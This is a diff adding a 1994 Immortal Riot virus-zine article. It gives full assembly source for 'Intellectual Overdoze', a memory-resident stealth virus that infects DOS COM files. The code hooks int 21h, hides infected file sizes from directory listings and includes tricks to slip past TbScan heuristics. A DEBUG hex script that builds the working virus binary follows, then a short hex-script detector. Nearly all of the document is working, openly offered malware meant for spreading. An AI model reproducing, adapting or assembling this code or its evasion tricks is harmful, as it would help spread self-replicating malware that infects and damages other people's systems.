@@ -1,0 +1,444 @@
+Insane Reality issue #6 - (c)opyright 1994 Immortal Riot                File 005
+
+; ------------------------------------------------------------------------------
+;
+;                       - Intellectual Overdoze -
+;       Created by Immortal Riot's destructive development team
+;              (c) 1994 The Unforgiven/Immortal Riot 
+;
+;-------------------------------------------------------------------------------
+;	   þ Memory Resident Stealth Infector of COM-programs þ
+;-------------------------------------------------------------------------------
+
+  Replication:
+
+   This virus will go resident, allocating 496 bytes below Top Of Memory. 
+   It will if resident infect com files that are executed (4b00h/int21h). 
+   If an infected file is being touched with the functions 11h or 12h/i21h, 
+   (i.e. like in a dos-dir), the virus will substract the added lenght from 
+   it, making this virus stealth.
+
+   The virus saves and restores the file's time/date stamp, but alter
+   the second-value to use to determinate if the virus should decrease
+   the file's lenght with its own code whenever a dos-dir is performed or
+   not.
+
+   As infection-marker, it checks the fourth character from beginning,
+   and if it's a 'V' (as in Victory, Virus or Vengence), it assumes that
+   it's already infected, and will ofcos not infect it again. Furthermore, 
+   no comfile below 3072 bytes or larger than 64000 bytes will be touched.
+
+  Future improvments:
+
+   It's doesnt modifies the file-attribs, hook int24h (the critical
+   error handler that is..), uses any encryption, and doesnt include
+   any damaging routine at all. This will probably be added in other
+   versions of it.. This is afterall, 'only' 472 bytes.
+
+  Anti-Virus-Detection:
+
+   Tbscan 6.26 hardest heuristics cannot detect one single flag, still
+   uses it no encryption, just some alternative routines to avoid detection
+   from it. This ofcos resulted in that some code looks quite ugly, but
+   what the fuck. This is profe enough that tbscan has no real code emulator. 
+   Enjoy!
+
+
+	.model  tiny
+        .code
+        org     100h
+
+start:  
+
+        jmp     virus_start                      ; for first generation only!
+        db      'V'                              ; mark org file infected
+
+virus_start:
+
+	mov     sp,102h                     	 ; get delta offset without
+        call    get_delta_offset                 ; getting detected by tbscan
+                                          
+                                                                 
+get_delta_offset:
+
+	call    cheat_tbscan               	 ; kick's tbscan's heuristics
+	mov     si,word ptr ds:[100h]            ; real bad!
+	mov     sp,0fffeh
+	sub     si,offset get_delta_offset
+	jmp     short go_resident
+
+cheat_tbscan:
+
+        mov     ax,0305h                         ; keyb i/o           
+        xor     bx,bx
+        int     16h
+        ret
+
+go_resident:
+
+        mov     bp,si                      
+
+installtion_check:
+
+        mov     ax,6666h                     
+        int     21h
+        cmp     bx,6666h		         ; 6666h returned in bx?
+        je      already_resident                 ; = assume resident
+
+        push    cs
+        pop     ds
+
+resize_memory_block:
+
+        mov     ah,4ah                       	 ; find top of memory
+        mov     bx,0ffffh		     	 ; (65536)
+        int     21h			     
+
+resize_memory_block_for_virus:
+
+        sub     bx,(virus_end-virus_start+15)/16+1  ; resize enough para's
+        mov     ah,4ah                              ; for virus
+        int     21h
+
+allocate_memory_block_for_virus:
+
+        mov     ah,48h				     ; allocate for virus
+        mov     bx,(virus_end-virus_start+15)/16
+        int     21h
+        jc      not_enough_mem  		     ; not enough memory!
+
+        dec     ax				     ; ax - 1 = mcb
+        push    es
+        
+mark_allocated_memory_block_to_dos:
+
+        mov     es,ax
+        mov     byte ptr es:[0],'Z'
+        mov     word ptr es:[1],8                ; dos = mcb owner
+        inc     ax
+
+copy_virus_to_memory:
+
+        cld					 ; clear direction for movsw
+        lea     si,[bp+offset virus_start]	 ; vir start
+        mov     es,ax
+	xor     di,di
+        mov     cx,(virus_end-virus_start+4)/2   ; vir len
+        rep     movsw
+
+manually_hook_of_int21h:
+
+        xor     ax,ax
+        mov     ds,ax
+        push    ds                            
+						 ; get/set int vector for int21
+        lds     ax,ds:[21h*4]                                            
+        mov     word ptr es:[oldint21h-virus_start],ax  
+        mov     word ptr es:[oldint21h-virus_start+2],ds
+        pop     ds
+        mov     word ptr ds:[21h*4],(newint21h-virus_start)
+
+        mov     bx,es				 ; cheat tbscan since
+        mov     ds:[21h*4+2],bx                  ; mov ds:[21h*4+2],es = M flag
+
+        push    cs                              
+        pop     ds                                                      
+                                                   
+exit:
+not_enough_mem:
+already_resident:
+
+        push    cs                                               
+        pop     es                               
+
+restore_first_bytes:
+
+        mov     di,100h                       
+        mov     cx,4                                                  
+        mov     si,offset orgbuf              
+ 	add     si,bp				 ; fix correct offset (delta)
+        repne   movsb				 
+
+jmp_org_program:
+						 
+        mov     ax,101h                          ; cheats tbscan's back to     
+	dec     ax                        	 ; entry point
+        jmp     ax                                    
+
+
+newint21h:
+
+        cmp     ax,4b00h                         ; file executed?
+        je      infect                           
+        
+        cmp     ah,11h                           ; fcb findfirst call?
+        je      fcb_stealth
+
+        cmp     ah,12h                     	 ; fcb findnext call?
+        je      fcb_stealth
+
+        cmp     ax,6666h                         ; residency check            
+        jne     do_old21h			 ; not resident
+        mov     bx,6666h                         ; return marker in bx
+
+do_old21h:
+
+        jmp     dword ptr cs:[(oldint21h-virus_start)] ; jmp ssss:oooo
+        ret                                     
+
+fcb_stealth:
+
+        pushf
+        push    cs				 ; fake a int call with pushf
+        call    do_old21h			 ; and cs, ip on the stack
+        cmp     al,00			    	 ; dir successfull?
+	jnz     dir_error			 ; naw, skip stealth routine!
+        push    ax                              
+        push    bx                              
+        push    es                              
+        mov     ah,51h                           ; Get active PSP to es:bx
+        int     21h                             
+        mov     es,bx                           
+        cmp     bx,es:[16h]                      ; Dos calling it?
+        jnz     not_dos				 ; Nope!
+        mov     bx,dx                           
+        mov     al,[bx]                          ; al = current drive
+        push    ax                               
+        mov     ah,2fh                           ; get dta area
+        int     21h                              
+        pop     ax                               ; check extended fcb 
+        inc     al                               ; "cmp byte ptr [bx],0ffh"
+        jnz     normal_fcb			 ; nope, regular fcb!
+
+ext_fcb:
+        add     bx,7h                            ; skip junkie if ext fcb
+
+normal_fcb:
+
+        mov     ax,es:[bx+17h]			 ; get second value
+        and     ax,1fh
+        xor     al,01h
+        jnz     no_stealth			 ; second-stealth value match
+
+; Here one should really check (i) if the file was a comfile, and (ii), 
+; the file-size ( >472 bytes) But oh well, maybe to come.. 
+
+        and     byte ptr es:[bx+17h],0e0h	 ; substract virus len
+        sub     es:[bx+1dh],(virus_end-virus_start)
+        sbb     es:[bx+1fh],ax                  
+
+no_stealth:
+not_dos:
+
+        pop     es                              
+        pop     bx                              
+        pop     ax                              
+        
+dir_error:   
+        iret                                    
+                                                
+infect:
+
+        push    ax                              
+        push    bx                              
+        push    cx
+        push    dx
+        push    di
+        push    si
+        push    ds
+        push    es
+
+open_file:
+
+        mov     ax,3d02h                         ; open file in read/write
+        int     21h                              ; mode
+        jc      error_open                       ; error on file open
+        
+        xchg    ax,bx                            ; file handle in bx
+                
+        push    ds                              
+        push    cs                              
+        pop     ds                              
+
+read_firstbytes:
+
+        mov     ah,3fh                           ; read first four bytes
+        mov     dx,(orgbuf-virus_start)          ; to orgbuf
+        mov     cx,4                            
+        int     21h                             
+
+
+check_file_executed:
+
+        cmp     byte ptr cs:[(orgbuf-virus_start)],'M'   ; check only first byte
+        je      exe_file                                 ; - fooling tbscan
+                                                          
+
+check_previous_infection:
+
+        cmp     byte ptr cs:[(orgbuf-virus_start)+3],'V' ; already infected?
+        je      already_infected
+
+        jmp     short get_file_time_date		 ; not infected
+
+error_open:
+already_infected:
+exe_file:
+
+
+        jmp     exit_proc                                ; dont infect file
+
+
+get_file_time_date:
+
+        mov     ax,5700h				 ; get time/date
+        int     21h
+
+        mov     word ptr cs:[(old_time-virus_start)],cx  ; save time
+        mov     word ptr cs:[(old_date-virus_start)],dx  ; and date
+ 
+go_endoffile:
+
+        mov     ax,4202h			         ; go end of file
+	xor     cx,cx
+        cwd
+        int     21h
+
+check_file_size:
+
+	cmp     ax,3072d			         ; check file-size
+        jb      too_small
+
+	cmp     ax,64000d
+        ja      too_big
+
+create_newjump:
+
+	sub     ax,3				         ; 0e9h,XX,XX,
+        mov     word ptr cs:[(newbuf+1-virus_start)],ax	 ; V => AX
+
+write_virus:
+
+        mov     ah,40h				  ; write virus to end of file
+        mov     cx,(virus_end-virus_start)
+;       cwd                                       ; (dx = 0 since go eof)
+        int     21h
+
+go_tof:
+
+        mov     ax,4200h
+	xor     cx,cx
+;       cwd                                        ; ( dx = 0 since go eof)
+        int     21h
+
+
+write_newjump:
+
+        mov     ah,40h                             ; write new jmp to tof
+        mov     cx,4 				   ; = 0E9H,XX,XX,V
+        mov     dx,(newbuf-virus_start)            ; offset to write from
+        int     21h
+        
+
+set_org_time_date:
+too_small:
+too_big:
+
+        mov     ax,5701h				   ; set back org
+        mov     word ptr cx,cs:[(old_time-virus_start)]    ; time
+        mov     word ptr dx,cs:[(old_date-virus_start)]    ; date
+        
+
+set_stealth_marker:
+
+ 	and     cl,0e0h                                    ; give file
+	inc     cl                                         ; specific
+        int     21h                                        ; second val
+
+close_file:
+
+        mov     ah,3eh                                     ; close file
+        int     21h
+
+exit_proc:
+
+        pop     ds
+        pop     es
+        pop     ds
+        pop     si
+        pop     di
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+
+        jmp     dword ptr cs:[(oldint21h-virus_start)]	   ; jmp ssss:oooo
+
+old_date  dw    0					   ; storage buffers
+old_time  dw    0					   ; for file time/date
+oldint21h dd    ?                                          ; and oldint21h
+
+orgbuf  db      0cdh,20h,00,00         ; buffer to save first 4 bytes in
+newbuf  db      0E9h,00,00,'V'         ; buffer to calculate a new entry
+
+copyrt  db      "[Overdoze] (c) 1994 The Unforgiven/Immortal Riot"
+
+virus_end:
+        end     start
+-------------------------------------------------------------------------------
+N iod.com
+E  100  EB 02 90 56 BC 02 01 E8 00 00 E8 0D 00 8B 36 00
+E  110  01 BC FE FF 81 EE 0A 01 EB 08 B8 05 03 33 DB CD
+E  120  16 C3 8B EE B8 66 66 CD 21 81 FB 66 66 74 5B 0E
+E  130  1F B4 4A BB FF FF CD 21 83 EB 1F 90 B4 4A CD 21
+E  140  B4 48 BB 1E 00 CD 21 72 41 48 06 8E C0 26 C6 06
+E  150  00 00 5A 26 C7 06 01 00 08 00 40 FC 8D B6 04 01
+E  160  8E C0 33 FF B9 EE 00 F3 A5 33 C0 8E D8 1E C5 06
+E  170  84 00 26 A3 9C 01 26 8C 1E 9E 01 1F C7 06 84 00
+E  180  9B 00 8C C3 89 1E 86 00 0E 1F 0E 07 BF 00 01 B9
+E  190  04 00 BE A4 02 03 F5 F2 A4 B8 01 01 48 FF E0 3D
+E  1a0  00 4B 74 60 80 FC 11 74 13 80 FC 12 74 0E 3D 66
+E  1b0  66 75 03 BB 66 66 2E FF 2E 9C 01 C3 9C 0E E8 F5
+E  1c0  FF 3C 00 75 3E 50 53 06 B4 51 CD 21 8E C3 26 3B
+E  1d0  1E 16 00 75 2B 8B DA 8A 07 50 B4 2F CD 21 58 FE
+E  1e0  C0 75 03 83 C3 07 26 8B 47 17 25 1F 00 34 01 75
+E  1f0  0F 26 80 67 17 E0 26 81 6F 1D D8 01 26 19 47 1F
+E  200  07 5B 58 CF 50 53 51 52 57 56 1E 06 B8 02 3D CD
+E  210  21 72 20 93 1E 0E 1F B4 3F BA A0 01 B9 04 00 CD
+E  220  21 2E 80 3E A0 01 4D 74 0A 2E 80 3E A3 01 56 74
+E  230  02 EB 03 EB 59 90 B8 00 57 CD 21 2E 89 0E 9A 01
+E  240  2E 89 16 98 01 B8 02 42 33 C9 99 CD 21 3D 00 0C
+E  250  72 24 3D 00 FA 77 1F 2D 03 00 2E A3 A5 01 B4 40
+E  260  B9 D8 01 CD 21 B8 00 42 33 C9 CD 21 B4 40 B9 04
+E  270  00 BA A4 01 CD 21 B8 01 57 2E 8B 0E 9A 01 2E 8B
+E  280  16 98 01 80 E1 E0 FE C1 CD 21 B4 3E CD 21 1F 07
+E  290  1F 5E 5F 5A 59 5B 58 2E FF 2E 9C 01 00 00 00 00
+E  2a0  00 00 00 00 CD 20 00 00 E9 00 00 56 5B 4F 76 65
+E  2b0  72 64 6F 7A 65 5D 20 28 63 29 20 31 39 39 34 20
+E  2c0  54 68 65 20 55 6E 66 6F 72 67 69 76 65 6E 2F 49
+E  2d0  6D 6D 6F 72 74 61 6C 20 52 69 6F 74 
+RCX
+1dc
+W
+Q
+--------------------------------------------------------------------------------
+  Anti-Virus:
+
+   Here follow a small debug-script of a detection program for
+   it. Don't want my readers to get in trouble. Oh well.
+
+N anti-iod.com
+E  100  EB 5E 50 53 56 1E 0E 50 5B 1F BE 5C 01 AD 3D 00
+E  110  00 74 10 3B D8 75 F6 B4 09 BA 2C 01 CD 21 B8 00
+E  120  4C CD 21 1F 5E 5B 58 EA 00 00 99 7C 49 6E 74 65
+E  130  6C 6C 65 63 74 75 61 6C 20 4F 76 65 72 64 6F 7A
+E  140  65 20 66 6F 75 6E 64 20 2D 20 41 62 6F 72 74 69
+E  150  6E 67 21 07 21 07 21 07 21 0A 0D 24 66 66 00 00
+E  160  B4 49 8E 06 2C 00 CD 21 B8 21 35 CD 21 89 1E 28
+E  170  01 8C 06 2A 01 B4 25 BA 02 01 CD 21 BA 6A 01 CD
+E  180  27 
+RCX
+81
+W
+Q
+
